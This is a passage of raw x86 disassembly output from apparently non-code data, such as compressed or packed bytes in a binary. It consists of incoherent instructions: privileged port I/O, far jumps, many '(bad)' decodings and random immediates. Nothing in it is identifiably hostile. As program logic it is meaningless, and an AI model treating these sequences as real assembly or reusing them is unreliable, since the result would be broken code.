  409ab5:	cmp    DWORD PTR [edx],esp
  409ab7:	pusha  
  409ab8:	fld    QWORD PTR [edi+0x72]
  409abb:	or     al,0x4d
  409abd:	fadd   st(2),st
  409abf:	hlt    
  409ac0:	sbb    al,0x34
  409ac2:	mov    ds:0x7c982160,al
  409ac7:	in     eax,dx
  409ac8:	sub    ebx,ebp
  409aca:	mov    ecx,0x6944e5bf
  409acf:	or     dh,BYTE PTR [edi]
  409ad1:	mov    DWORD PTR [edi+0x5ba06831],ebx
  409ad7:	ffree  st(2)
  409ad9:	into   
  409ada:	repnz rcl DWORD PTR [edi-0x44e4568b],1
  409ae1:	stos   DWORD PTR es:[edi],eax
  409ae2:	ror    DWORD PTR [ebp-0x28],1
  409ae5:	in     al,0xac
  409ae7:	mov    al,0xa
  409ae9:	icebp  
  409aea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409aeb:	inc    edi
  409aec:	into   
  409aed:	pop    es
  409aee:	pop    esp
  409aef:	push   ds
  409af0:	sbb    ebx,edi
  409af2:	push   eax
  409af3:	mov    esp,0x6d036eb6
  409af8:	mov    al,ds:0xeabf66fd
  409afd:	test   DWORD PTR [ebp-0x44],edi
  409b00:	mov    DWORD PTR [eax+ecx*4+0x4b],eax
  409b04:	pop    ecx
  409b05:	sbb    ecx,esp
  409b07:	add    eax,0xd242510f
  409b0c:	pusha  
  409b0d:	mov    BYTE PTR [ecx],0xd4
  409b10:	cmp    al,0xb7
  409b12:	cli    
  409b13:	icebp  
  409b14:	inc    ebx
  409b15:	cs sub al,0x15
  409b18:	neg    BYTE PTR [ebx-0x47]
  409b1b:	mov    bh,0x58
  409b1d:	mov    bl,0xde
  409b1f:	call   0x3ec:0xdd2c4a83
  409b26:	mov    BYTE PTR [ebp+0xc26a2e1],dh
  409b2c:	push   cs
  409b2d:	jb     0x409b7d
  409b2f:	pop    ebx
  409b30:	sar    DWORD PTR [ebx-0x57916d8d],1
  409b36:	lods   eax,DWORD PTR ds:[esi]
  409b37:	add    ax,0x9d40
  409b3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b3c:	(bad)  [edx]
  409b3e:	(bad)  
  409b40:	pop    ecx
  409b41:	ret    0x13df
  409b44:	mov    al,0x3e
  409b46:	mov    eax,0x93868fd6
  409b4b:	adc    dh,ch
  409b4d:	out    0xe0,al
  409b4f:	(bad)  
  409b50:	ror    BYTE PTR [eax+0x46],1
  409b53:	xor    al,0x1e
  409b55:	push   eax
  409b56:	xor    eax,esp
  409b58:	jle    0x409b29
  409b5a:	outs   dx,DWORD PTR ds:[esi]
  409b5b:	in     al,dx
  409b5c:	sbb    eax,0x5c9875fc
  409b61:	mov    cl,0xb
  409b63:	and    dl,BYTE PTR [ecx]
  409b65:	or     BYTE PTR [ecx],al
  409b67:	test   al,0x93
  409b69:	jo     0x409ba6
  409b6b:	dec    esi
  409b6c:	setl   BYTE PTR [esi]
  409b6f:	pusha  
  409b70:	sbb    BYTE PTR [ebx+0x36fb025],0x3a
  409b77:	inc    ecx
  409b78:	lods   al,BYTE PTR ds:[esi]
  409b79:	xor    DWORD PTR [ecx+eax*4+0x34],eax
  409b7d:	in     eax,0x21
  409b7f:	adc    edi,ecx
  409b81:	and    cl,0xaf
  409b84:	mov    al,BYTE PTR [edi]
  409b86:	dec    esi
  409b87:	cmp    ah,BYTE PTR ds:0x669cdd8
  409b8d:	xor    al,0x74
  409b8f:	jmp    0x2007:0x509b4552
  409b96:	inc    DWORD PTR [edx+0x27]
  409b99:	faddp  st(4),st
  409b9b:	mov    dl,0x32
  409b9d:	iret   
  409b9e:	mov    cl,0xdc
  409ba0:	push   ds
  409ba1:	xchg   ebp,eax
  409ba2:	ins    BYTE PTR es:[edi],dx
  409ba3:	adc    ah,BYTE PTR [eax]
  409ba5:	xchg   BYTE PTR [ebx+0x4b],ah
  409ba8:	jbe    0x409b61
  409baa:	popf   
  409bab:	cdq    
  409bac:	mov    edx,0xae765266
  409bb1:	aas    
  409bb2:	addr16 sub eax,0x8d164b04
  409bb8:	mov    ebx,ss
  409bba:	les    ebp,FWORD PTR [edx-0x1672a4b7]
  409bc0:	dec    eax
  409bc1:	and    al,0x22
  409bc3:	scas   al,BYTE PTR es:[edi]
  409bc4:	inc    ebx
  409bc5:	retf   
  409bc6:	imul   ebx,edx,0x2d1d2ed9
  409bcc:	or     DWORD PTR [ecx+eax*1],0x71
  409bd0:	ror    DWORD PTR [esi],cl
  409bd2:	bnd jg 0x409c48
  409bd5:	imul   edi,DWORD PTR [ebx],0x8ab737f6
  409bdb:	out    dx,al
  409bdc:	xor    BYTE PTR [edx+eax*4-0x37ea98f9],0xdf
  409be4:	jnp    0x409be4
  409be6:	cmp    ah,ah
  409be8:	fmul   QWORD PTR [edx+0x2c]
  409beb:	(bad)  
  409bec:	test   al,0x12
  409bee:	loopne 0x409c02
  409bf0:	adc    dl,BYTE PTR [esi]
  409bf2:	psubsw mm0,QWORD PTR [eax+0x4bd800eb]
  409bf9:	push   eax
  409bfa:	out    0x1c,al
  409bfc:	jp     0x409bab
  409bfe:	mov    ah,0xa7
  409c00:	mov    eax,ds:0xe5d1f146
  409c05:	ja     0x409c07
  409c07:	cwde   
  409c08:	outs   dx,DWORD PTR ds:[esi]
  409c09:	jmp    0x409c56
  409c0b:	cld    
  409c0c:	inc    edx
  409c0d:	retf   
  409c0e:	js     0x409c31
  409c10:	jl     0x409ba7
  409c12:	lea    ecx,[esi]
  409c14:	sti    
  409c15:	push   0x4b80df79
  409c1a:	ret    
  409c1b:	adc    BYTE PTR [ebx+edx*8-0x5e4ef9cc],bl
  409c22:	sub    BYTE PTR ds:0x556e1a9b,al
  409c28:	inc    edx
  409c29:	dec    esp
  409c2a:	test   al,0x76
  409c2c:	mov    bl,0x93
  409c2e:	cs add eax,0xc9b996b9
  409c34:	daa    
  409c35:	repz or eax,0x3515a7e0
  409c3b:	into   
  409c3c:	and    dl,BYTE PTR [edx+0x2e9cfdcf]
  409c42:	or     bl,BYTE PTR [eax]
  409c44:	mov    ch,0x86
  409c46:	(bad)  
  409c47:	fcomp  st(6)
  409c49:	push   esp
  409c4a:	pop    ebp
  409c4b:	xor    edx,DWORD PTR [ebp-0x51]
  409c4e:	sub    al,0x6b
  409c50:	hlt    
  409c51:	jbe    0x409bd6
  409c53:	inc    ebx
  409c54:	fistp  WORD PTR [ecx+0x7683ea20]
  409c5a:	aas    
  409c5b:	sti    
  409c5c:	xor    DWORD PTR [eax],edx
  409c5e:	test   al,0xe3
  409c60:	inc    ebx
  409c61:	jp     0x409c66
  409c63:	fnstcw WORD PTR [edi+0x3d2ee04f]
  409c69:	shl    BYTE PTR [ebp+0x31],cl
  409c6c:	cmp    bh,dl
  409c6e:	mov    al,ds:0x64ad308
  409c73:	mov    ds:0x2f1cb28a,al
  409c78:	das    
  409c79:	neg    edi
  409c7b:	loopne 0x409c4b
  409c7d:	fcomp  st(4)
  409c7f:	fld    DWORD PTR [ebx]
  409c81:	adc    al,0x61
  409c83:	inc    ebx
  409c84:	xchg   esi,eax
  409c85:	loopne 0x409c74
  409c87:	out    dx,eax
  409c88:	mov    eax,ds:0x1dd69a53
  409c8d:	not    BYTE PTR [eax+0x64]
  409c90:	mov    bh,0x6
  409c92:	test   eax,0xc624ea08
  409c97:	mov    bh,0x67
  409c99:	mov    ah,0xf0
  409c9b:	add    bl,dl
  409c9d:	(bad)  
  409c9e:	dec    edi
  409c9f:	lea    eax,[eax-0x359f0f50]
  409ca5:	jne    0x409cb0
  409ca7:	mov    eax,ds:0xcef49c4b
  409cac:	pop    ds
  409cad:	push   edx
  409cae:	ds pop ebp
  409cb0:	sub    eax,0x347bed1b
  409cb5:	add    DWORD PTR [eax+0x3bf94562],edi
  409cbb:	(bad)  
  409cbc:	pop    edx
  409cbd:	cmc    
  409cbe:	and    BYTE PTR [esi],dh
  409cc0:	inc    edi
  409cc1:	(bad)
  409cc4:	test   BYTE PTR [ecx+0x41],al
  409cc7:	xor    eax,0xbefc2e6b
  409ccc:	jecxz  0x409c80
  409cce:	sub    eax,0xf771e27e
  409cd3:	loope  0x409d28
  409cd5:	pushf  
  409cd6:	arpl   WORD PTR [eax+0x73],di
  409cd9:	adc    ebx,esp
  409cdb:	jno    0x409d2a
  409cdd:	add    BYTE PTR [ecx+ebp*1+0x40269a7f],bh
  409ce4:	mov    bh,0xf9
  409ce6:	add    eax,0x148629a6
  409ceb:	push   ebp
  409cec:	mov    ah,0x39
  409cee:	dec    eax
  409cef:	mov    bl,0x76
  409cf1:	dec    eax
  409cf2:	sbb    al,0x99
  409cf4:	pop    edx
  409cf5:	enter  0xd199,0x62
  409cf9:	clc    
  409cfa:	cmp    dl,BYTE PTR [ecx]
  409cfc:	adc    ecx,DWORD PTR [esi]
  409cfe:	mov    al,0x5a
  409d00:	sbb    BYTE PTR [ecx+0x13],dl
  409d03:	sbb    ecx,DWORD PTR [edi+ecx*2-0x74]
  409d07:	jnp    0x409cae
  409d09:	xor    DWORD PTR [esi],ebp
  409d0b:	push   ds
  409d0c:	call   FWORD PTR [ebp+0x9]
  409d0f:	xrelease mov BYTE PTR [edi],dl
  409d12:	jp     0x409ca8
  409d14:	in     eax,dx
  409d15:	push   0xffffffd0
  409d17:	lds    edx,FWORD PTR [edi+0x1b]
  409d1a:	mov    BYTE PTR [ecx+edi*2-0x7e],ch
  409d1e:	mov    ah,0xbd
  409d20:	out    dx,eax
  409d21:	adc    cl,ah
  409d23:	adc    DWORD PTR [edi],0xffffffcb
  409d26:	fisttp WORD PTR [esi]
  409d28:	push   ebp
  409d29:	lea    edx,[edi-0x22f8a231]
  409d2f:	inc    ecx
  409d30:	jne    0x409d60
  409d32:	ret    
  409d33:	mov    bl,0xf0
  409d35:	xchg   ecx,eax
  409d36:	pop    eax
  409d37:	xchg   ebx,eax
  409d38:	jl     0x409d66
  409d3a:	push   cs
  409d3b:	arpl   WORD PTR [esi-0x16],cx
  409d3e:	or     ah,ah
  409d40:	popf   
  409d41:	fldenv [ecx-0x434f18ce]
  409d47:	jae    0x409dbb
  409d49:	mov    ecx,0x1b040477
  409d4e:	lea    esp,[ecx+0x781151f6]
  409d54:	ins    DWORD PTR es:[edi],dx
  409d55:	popf   
  409d56:	and    BYTE PTR [esi],0xa8
  409d59:	dec    ebp
  409d5a:	imul   edx,DWORD PTR [ecx],0xff2a91e4
  409d60:	add    al,0x79
  409d62:	int    0xe4
  409d64:	mov    ds,WORD PTR [ebp+0x7f]
  409d67:	dec    esp
  409d68:	sub    eax,0x82ec6ad3
  409d6d:	pop    ebp
  409d6e:	and    al,0xeb
  409d70:	mov    DWORD PTR [esi],edx
  409d72:	jbe    0x409d19
  409d74:	out    0xca,eax
  409d76:	imul   esi,DWORD PTR cs:[ecx],0xffffffd8
  409d7a:	push   edx
  409d7b:	mov    dl,0xe
  409d7d:	and    DWORD PTR [ecx+0x48aafa77],0xfffffff4
  409d84:	fidiv  WORD PTR [ecx+0x3147edf0]
  409d8a:	sbb    bl,bl
  409d8c:	push   0x1f
  409d8e:	imul   esi,esp,0xffffffd7
  409d91:	jmp    0x3bfab297
  409d96:	xor    DWORD PTR [ebp+0x295020d8],0xffffffbc
  409d9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d9e:	push   ds
  409d9f:	cmp    eax,0x75e8eb51
  409da4:	bound  ebx,QWORD PTR ds:0xad0cf1e4
  409daa:	popf   
  409dab:	jp     0x409d5b
  409dad:	sub    eax,0xa7a38471
  409db2:	call   DWORD PTR [ecx+ebx*2-0x10a03a16]
  409db9:	or     ecx,ecx
  409dbb:	sbb    dh,ah
  409dbd:	or     bx,bx
  409dc0:	popf   
  409dc1:	hlt    
  409dc2:	jmp    0xa05c7bf5
  409dc7:	pushf  
  409dc8:	pop    es
  409dc9:	inc    ebx
  409dca:	je     0x409dee
  409dcc:	inc    esp
  409dcd:	pop    ds
  409dce:	inc    eax
  409dcf:	and    eax,0x5dc8f945
  409dd4:	aaa    
  409dd5:	jmp    0x409e10
  409dd7:	scas   eax,DWORD PTR es:[edi]
  409dd8:	gs pop edx
  409dda:	pop    ebx
  409ddb:	(bad)  
  409ddc:	dec    DWORD PTR [ecx+0xd]
  409ddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409de0:	shl    DWORD PTR [esi],1
  409de2:	fmul   DWORD PTR [ebp+0x67fe0d8a]
  409de8:	cld    
  409de9:	dec    esi
  409dea:	push   ds
  409deb:	mov    edi,0x76e289ea
  409df0:	add    ah,BYTE PTR [esi-0x11b6adac]
  409df6:	push   eax
  409df7:	add    BYTE PTR ds:0x8cc5b7bf,ah
  409dfd:	shl    DWORD PTR [ebp-0x7d0c64bc],0x7
  409e04:	cli    
  409e05:	adc    dl,BYTE PTR [eax]
  409e07:	ret    
  409e08:	push   ss
  409e09:	xor    bh,BYTE PTR [esi+ebx*2+0x0]
  409e0d:	dec    edi
  409e0e:	dec    esi
  409e0f:	xchg   ecx,eax
  409e10:	jp     0x409e1c
  409e12:	pop    ss
  409e13:	jl     0x409e40
  409e15:	fcomp  QWORD PTR [esi-0x6cca45c7]
  409e1b:	iret   
  409e1c:	add    ch,BYTE PTR [ebp-0x44e29c67]
  409e22:	mov    esi,DWORD PTR [ebx+ebx*4+0x49a34481]
  409e29:	pop    eax
  409e2a:	mov    al,BYTE PTR [edx-0x1777caeb]
  409e30:	out    dx,eax
  409e31:	adc    DWORD PTR [ecx+eiz*8-0x3f],ebp
  409e35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e36:	jge    0x409e2c
  409e38:	sbb    dl,al
  409e3a:	sub    DWORD PTR [edi],ecx
  409e3c:	dec    esi
  409e3d:	pushf  
  409e3e:	pop    esp
  409e3f:	mov    dh,0xdf
  409e41:	pop    esp
  409e42:	or     eax,0xbdc98e49
  409e47:	mov    ecx,?
  409e49:	jne    0x409e16
  409e4b:	cmp    al,0x68
  409e4d:	jae    0x409e45
  409e4f:	inc    eax
  409e50:	xor    al,0xdb
  409e52:	push   edx
  409e53:	cmp    eax,DWORD PTR [edi]
  409e55:	xchg   esp,eax
  409e56:	pop    esi
  409e57:	out    dx,eax
  409e58:	mov    ecx,0xb385ce05
  409e5d:	retf   
  409e5e:	cs inc edi
  409e60:	fwait
  409e61:	mov    bh,BYTE PTR [edx+ecx*8+0x79123713]
  409e68:	and    eax,0xe2aa6b1e
  409e6d:	and    edi,DWORD PTR [eax]
  409e6f:	adc    BYTE PTR [edx+0x360635a9],0x80
  409e76:	nop    ebp
  409e79:	sbb    eax,DWORD PTR [eax+edi*4-0x7f]
  409e7d:	aas    
  409e7e:	ficom  DWORD PTR [ecx-0x38]
  409e81:	aad    0xdd
  409e83:	and    esp,DWORD PTR [edx+0x961540c]
  409e89:	inc    esp
  409e8a:	sahf   
  409e8b:	fisubr WORD PTR [eax-0x69]
  409e8e:	mov    bh,0x8d
  409e90:	ror    ah,1
  409e92:	ja     0x409f05
  409e94:	rcl    BYTE PTR [edi-0x78c490d5],1
  409e9a:	stc    
  409e9b:	je     0x409e3d
  409e9d:	dec    eax
  409e9e:	stos   DWORD PTR es:[edi],eax
  409e9f:	mov    ah,0x28
  409ea1:	stos   DWORD PTR es:[edi],eax
  409ea2:	adc    eax,0xb37c54d5
  409ea7:	pop    esp
  409ea8:	sub    eax,0xbb9fbf0a
  409ead:	call   0xecec:0xd75fe09
  409eb4:	ins    BYTE PTR es:[edi],dx
  409eb5:	push   esi
  409eb6:	int    0xac
  409eb8:	mov    WORD PTR [ebx+0x75840966],?
  409ebe:	outs   dx,BYTE PTR ds:[esi]
  409ebf:	jl     0x409ead
  409ec1:	inc    edi
  409ec2:	(bad)  
  409ec3:	sti    
  409ec4:	or     eax,0x8e187e56
  409ec9:	les    edi,FWORD PTR [edi-0x5e]
  409ecc:	push   edi
  409ecd:	es adc al,0x83
  409ed0:	das    
  409ed1:	push   ebp
  409ed2:	inc    eax
  409ed3:	xchg   edx,eax
  409ed4:	clc    
  409ed5:	push   cs
  409ed6:	idiv   DWORD PTR [edi]
  409ed8:	int3   
  409ed9:	(bad)  
  409eda:	aas    
  409edb:	sbb    DWORD PTR [eax-0x1ce55e4f],eax
  409ee1:	shl    BYTE PTR [edx+0x1df066ac],0x37
  409ee8:	push   ecx
  409ee9:	sub    DWORD PTR [ebp-0x5f],ebx
  409eec:	out    dx,al
  409eed:	int    0x31
  409eef:	jbe    0x409f36
  409ef1:	or     edi,ebp
  409ef3:	pop    ss
  409ef4:	imul   ecx,esp,0x32
  409ef7:	stc    
  409ef8:	fcom   QWORD PTR [ecx-0x1766c38b]
  409efe:	jmp    0xc188:0x672629de
  409f05:	or     eax,0xbb788cc3
  409f0a:	shld   DWORD PTR [ebx-0x75],edx,0xdc
  409f0f:	xchg   ebp,eax
  409f10:	js     0x409f39
  409f12:	mov    bh,0x12
  409f14:	pop    edi
  409f15:	mov    esi,0xf352a62b
  409f1a:	aam    0x49
  409f1c:	aad    0xd5
  409f1e:	pop    ecx
  409f1f:	xor    eax,0x4b2d9975
  409f24:	cli    
  409f25:	xor    al,0x1d
  409f27:	adc    al,0x5b
  409f29:	gs dec ecx
  409f2b:	mov    eax,0x6f99d3e
  409f30:	cs push edx
  409f32:	inc    esp
  409f33:	test   ah,cl
  409f35:	ss loop 0x409f00
  409f38:	icebp  
  409f39:	popa   
  409f3a:	mov    BYTE PTR [ebp-0x3b265915],bh
  409f40:	(bad)  
  409f41:	mul    ch
  409f43:	fmul   st(3),st
  409f45:	pop    ebp
  409f46:	add    ecx,DWORD PTR [ecx]
  409f48:	js     0x409ee1
  409f4a:	imul   ecx
  409f4c:	adc    eax,0xba27b0f7
  409f51:	jno    0x409f3f
  409f53:	mov    dh,0xf7
  409f55:	push   edx
  409f56:	adc    al,BYTE PTR [esi+0x6d]
  409f59:	test   DWORD PTR [eax+0x2f7c781c],edi
  409f5f:	cwde   
  409f60:	jg     0x409fcb
  409f62:	jno    0x409f33
  409f64:	in     al,0x70
  409f66:	jecxz  0x409f97
  409f68:	jge    0x409fa8
  409f6a:	enter  0x5039,0x8f
  409f6e:	das    
  409f6f:	test   ch,al
  409f71:	jnp    0x409fe2
  409f73:	push   edx
  409f74:	or     al,0x43
  409f76:	mov    eax,ds:0x59f534a3
  409f7b:	enter  0x14e3,0x98
  409f7f:	or     dl,BYTE PTR [ebx*4+0x16b9a6a2]
  409f86:	scas   al,BYTE PTR es:[edi]
  409f87:	mov    dh,0x1
  409f89:	shl    BYTE PTR [edx],cl
  409f8b:	jecxz  0x409fd4
  409f8d:	or     DWORD PTR [edx+0x4e158539],ebp
  409f93:	cmc    
  409f94:	fdivr  st(0),st
  409f96:	(bad)  
  409f97:	cli    
  409f98:	ror    BYTE PTR ds:0x86b3b722,cl
  409f9e:	mov    ebp,0x3b2407a1
  409fa3:	rcl    BYTE PTR [ebx],1
  409fa5:	(bad)  
  409fa6:	std    
  409fa7:	dec    eax
  409fa8:	loope  0x409fe6
  409faa:	aam    0xf4
  409fac:	dec    esi
  409fad:	or     al,bl
  409faf:	dec    edi
  409fb0:	js     0x409fc2
  409fb2:	jnp    0x409f90
  409fb4:	mov    ebx,0x4e912ba1
  409fb9:	xchg   esi,eax
  409fba:	gs aaa 
  409fbc:	lock mov ecx,0x52bf7704
  409fc2:	pusha  
  409fc3:	out    0x85,al
  409fc5:	ds inc esp
  409fc7:	or     bl,dh
  409fc9:	out    dx,al
  409fca:	sti    
  409fcb:	pop    ecx
  409fcc:	xchg   DWORD PTR [ebp-0x49],esi
  409fcf:	call   0x6c57:0xc1cad602
  409fd6:	adc    esp,0x6b
  409fd9:	in     al,0xa1
  409fdb:	rol    eax,cl
  409fdd:	mov    dl,0xf1
  409fdf:	cwde   
  409fe0:	mov    esi,DWORD PTR [ecx]
  409fe2:	out    dx,eax
  409fe3:	jecxz  0x409fab
  409fe5:	cmc    
  409fe6:	mov    edi,0xf56c5770
  409feb:	int    0xed
  409fed:	std    
  409fee:	(bad)  
  409fef:	fisttp DWORD PTR [ebx]
  409ff1:	and    BYTE PTR [edx+0x7d575c02],ch
  409ff7:	leave  
  409ff8:	push   esp
  409ff9:	in     eax,0xe8
  409ffb:	mov    edx,0xddc5a5aa
  40a000:	mov    al,0xa9
  40a002:	pop    edx
  40a003:	cmp    eax,0xfa76f5e3
  40a008:	popf   
  40a009:	sbb    ah,BYTE PTR [edx]
  40a00b:	shl    BYTE PTR [ecx],1
  40a00d:	scas   al,BYTE PTR es:[edi]
  40a00e:	pop    es
  40a00f:	inc    eax
  40a010:	arpl   WORD PTR [esi],ax
  40a012:	mov    eax,0x22ed21f0
  40a017:	je     0x409ffb
  40a019:	test   BYTE PTR [edi],ch
  40a01b:	repz mov edx,0xaf776e4
  40a021:	add    DWORD PTR [ecx],esi
  40a023:	adc    ebp,esp
  40a025:	rcl    DWORD PTR [ebp-0xe458d7b],0x4a
  40a02c:	retf   0x7348
  40a02f:	xchg   BYTE PTR [eax+0x6b],ch
  40a032:	sub    ah,BYTE PTR [ebp+0x7f]
  40a035:	add    DWORD PTR [ebp+0x44],edx
  40a038:	xchg   ebp,eax
  40a039:	ss xchg ecx,esp
  40a03c:	neg    BYTE PTR [esi+0x60c47229]
  40a042:	leave  
  40a043:	mov    eax,DWORD PTR [esi+0x42]
  40a046:	push   ebp
  40a047:	ins    BYTE PTR es:[edi],dx
  40a048:	push   ecx
  40a049:	or     DWORD PTR [edx],ebp
  40a04b:	add    eax,0x354538be
  40a050:	adc    al,0xb7
  40a052:	or     esp,DWORD PTR [edi]
  40a054:	test   BYTE PTR [eax],bl
  40a056:	stos   DWORD PTR es:[edi],eax
  40a057:	ins    BYTE PTR es:[edi],dx
  40a058:	repz inc edx
  40a05a:	fwait
  40a05b:	call   0xc7626c0d
  40a060:	sbb    cl,BYTE PTR [ecx+0x18f29080]
  40a066:	push   ebx
  40a067:	sbb    DWORD PTR [esi-0x74],ebp
  40a06a:	mov    ebx,0xb81b4730
  40a06f:	ins    BYTE PTR es:[edi],dx
  40a070:	push   ebp
  40a071:	mov    edx,0xa6d396df
  40a076:	(bad)  [edx-0x4d]
  40a079:	test   eax,0x5751253d
  40a07e:	imul   ecx,edx,0x57
  40a081:	sbb    BYTE PTR [eax-0x7b7dfd22],bl
  40a087:	nop
  40a088:	jnp    0x40a0d7
  40a08a:	pop    es
  40a08b:	jecxz  0x40a0dc
  40a08d:	adc    al,0x94
  40a08f:	inc    esp
  40a090:	mov    cl,0xba
  40a092:	mov    cl,ah
  40a094:	cmp    al,0x52
  40a096:	mov    ah,0x44
  40a098:	mov    cl,0x65
  40a09a:	and    ch,BYTE PTR [edx+0x11]
  40a09d:	sub    al,0x8f
  40a09f:	fdivrp st(6),st
  40a0a1:	(bad)  
  40a0a2:	popa   
  40a0a3:	lods   al,BYTE PTR ds:[esi]
  40a0a4:	dec    ebp
  40a0a5:	jl     0x40a0b5
  40a0a7:	push   cs
  40a0a8:	add    DWORD PTR [eax-0x5e0e39ce],ebx
  40a0ae:	stc    
  40a0af:	mov    edi,0x8e67393d
  40a0b4:	jmp    0x40a04d
  40a0b6:	hlt    
  40a0b7:	dec    edx
  40a0b8:	push   bx
  40a0ba:	scas   al,BYTE PTR es:[edi]
  40a0bb:	call   DWORD PTR [ecx+0x1c0bc699]
  40a0c1:	add    DWORD PTR [esi],eax
  40a0c3:	cs into 
  40a0c5:	xor    ecx,ebp
  40a0c7:	cdq    
  40a0c8:	stc    
  40a0c9:	addr16 jo 0x40a11c
  40a0cc:	xchg   ebp,eax
  40a0cd:	cdq    
  40a0ce:	xchg   BYTE PTR [edi+0x6b],bh
  40a0d1:	repz sbb eax,0xcf1041ce
  40a0d7:	loopne 0x40a121
  40a0d9:	aaa    
  40a0da:	mov    eax,ds:0x6e1dacaf
  40a0df:	ds nop
  40a0e1:	sbb    ebp,DWORD PTR [edi]
  40a0e3:	les    edx,FWORD PTR [ebp-0x19d1969f]
  40a0e9:	xchg   edx,eax
  40a0ea:	lea    edx,[esi]
  40a0ec:	fimul  WORD PTR [esp+ecx*4]
  40a0ef:	pushf  
  40a0f0:	adc    ch,dh
  40a0f2:	adc    cl,cl
  40a0f4:	mov    bl,0xbc
  40a0f6:	jne    0x40a09d
  40a0f8:	mov    esp,0x75f02fb0
  40a0fd:	sbb    bh,BYTE PTR [edi]
  40a0ff:	inc    edi
  40a100:	mov    ds:0xe150b18d,eax
  40a105:	and    ch,BYTE PTR ds:0xefad5fd8
  40a10b:	sar    bl,0x13
  40a10e:	cmp    BYTE PTR [ebp-0x62],cl
  40a111:	adc    ebp,DWORD PTR [edi-0x5de5558b]
  40a117:	sete   BYTE PTR [eax+0x144f4ea5]
  40a11e:	jg     0x40a0bc
  40a120:	push   ebx
  40a121:	xor    eax,0x9015c996
  40a126:	pop    ecx
  40a127:	inc    ebp
  40a128:	or     eax,0x4911c2aa
  40a12d:	jne    0x40a0f1
  40a12f:	mov    ebx,0x337e915
  40a134:	dec    ebx
  40a135:	rcl    BYTE PTR [ecx],cl
  40a137:	mov    ecx,0x4ba0ac45
  40a13c:	jno    0x40a14b
  40a13e:	lds    eax,FWORD PTR [eax-0x2a]
  40a141:	jne    0x40a129
  40a143:	push   ebx
  40a144:	psubusb mm0,QWORD PTR [edx+0x7]
  40a148:	aaa    
  40a149:	mov    ebx,0xd544bba6
  40a14e:	push   0x1f00280a
  40a153:	retf   
  40a154:	shl    DWORD PTR [edx+0x3b085da9],cl
  40a15a:	(bad)  
  40a15b:	xor    edx,DWORD PTR [esi-0x5d]
  40a15e:	retf   
  40a15f:	push   ecx
  40a160:	jns    0x40a168
  40a162:	lea    ebx,[ecx]
  40a164:	cmp    DWORD PTR [ecx],edx
  40a166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a167:	adc    al,0xd8
  40a169:	pop    ecx
  40a16a:	sbb    cl,bl
  40a16c:	xor    DWORD PTR [eax+0x38],ecx
  40a16f:	push   ss
  40a170:	clc    
  40a171:	ret    
  40a172:	leave  
  40a173:	ins    BYTE PTR es:[edi],dx
  40a174:	jbe    0x40a10f
  40a176:	cmp    BYTE PTR [ebp+0x5a],ch
  40a179:	in     al,0xa1
  40a17b:	sub    esp,DWORD PTR [ebp+0x57]
  40a17e:	cmp    al,0xfa
  40a180:	sub    DWORD PTR [ebx-0x50b29e92],ebp
  40a186:	fcmovbe st,st(6)
  40a188:	adc    eax,0x1543e9
  40a18d:	ss retf 
  40a18f:	adc    DWORD PTR [edx+0x2aa4e7c3],edx
  40a195:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a196:	adc    BYTE PTR [edx],dh
  40a198:	test   al,0x66
  40a19a:	pop    edx
  40a19b:	ins    BYTE PTR es:[edi],dx
  40a19c:	sbb    BYTE PTR ds:0x48dc723a,ch
  40a1a2:	idiv   BYTE PTR [ecx+ecx*8]
  40a1a5:	xor    al,0x28
  40a1a7:	sbb    BYTE PTR [ebx+0x7e1a3edd],dh
  40a1ad:	dec    eax
  40a1ae:	fiadd  WORD PTR [edx-0x50ab3c5c]
  40a1b4:	xor    bh,BYTE PTR [eax]
  40a1b6:	push   edx
  40a1b7:	dec    edx
  40a1b8:	add    BYTE PTR [edi+0x7766aa0d],ch
  40a1be:	aaa    
  40a1bf:	(bad)  
  40a1c0:	xor    eax,ebx
  40a1c2:	or     eax,0x934cdabd
  40a1c7:	sahf   
  40a1c8:	add    al,0xf5
  40a1ca:	sbb    ch,BYTE PTR [eax]
  40a1cc:	fdiv   DWORD PTR [edx]
  40a1ce:	stos   DWORD PTR es:[edi],eax
  40a1cf:	inc    esi
  40a1d0:	sub    DWORD PTR ds:0x2ea88d07,esi
  40a1d6:	into   
  40a1d7:	xchg   ebx,eax
  40a1d8:	jbe    0x40a20d
  40a1da:	(bad)  
  40a1db:	mov    bl,0xaa
  40a1dd:	dec    esp
  40a1de:	jns    0x40a259
  40a1e0:	xor    eax,0x8d58a0f4
  40a1e5:	xchg   DWORD PTR [esi-0x2f],esp
  40a1e8:	mov    ebp,0xd5372d69
  40a1ed:	in     al,dx
  40a1ee:	push   0x72dc7208
  40a1f3:	inc    edx
  40a1f4:	mov    bl,0xaa
  40a1f6:	popa   
  40a1f7:	pop    esp
  40a1f8:	in     al,0x55
  40a1fa:	rep ins BYTE PTR es:[edi],dx
  40a1fc:	and    BYTE PTR [edx-0x58d700c3],cl
  40a202:	outs   dx,BYTE PTR ds:[esi]
  40a203:	retf   
  40a204:	xor    DWORD PTR [ebx],edx
  40a206:	and    eax,0xd0c90342
  40a20b:	xchg   dh,al
  40a20d:	push   edx
  40a20e:	xor    cl,ah
  40a210:	sub    al,0x8a
  40a212:	fbld   TBYTE PTR [eax-0x27]
  40a215:	loope  0x40a222
  40a217:	fld    QWORD PTR [eax-0xf600651]
  40a21d:	and    DWORD PTR [ecx-0x4],edx
  40a220:	es jae 0x40a254
  40a223:	inc    eax
  40a224:	push   0x72aafe2
  40a229:	test   bh,dh
  40a22b:	fs push ebp
  40a22d:	adc    ch,dl
  40a22f:	dec    edx
  40a230:	div    DWORD PTR [esi]
  40a232:	stos   BYTE PTR es:[edi],al
  40a233:	pop    ecx
  40a234:	leave  
  40a235:	dec    ebx
  40a236:	fcomp  DWORD PTR [eax+0x61]
  40a239:	gs mov ah,0x66
  40a23c:	shl    bl,cl
  40a23e:	les    ebp,FWORD PTR [ebp-0x4]
  40a241:	mov    ch,0x7c
  40a243:	rcl    BYTE PTR [eax+0x2d0a91c7],0x7
  40a24a:	mov    WORD PTR [ecx+0x3a],ss
  40a24d:	lods   al,BYTE PTR ds:[esi]
  40a24e:	leave  
  40a24f:	xchg   edi,eax
  40a250:	inc    ebx
  40a251:	pop    esi
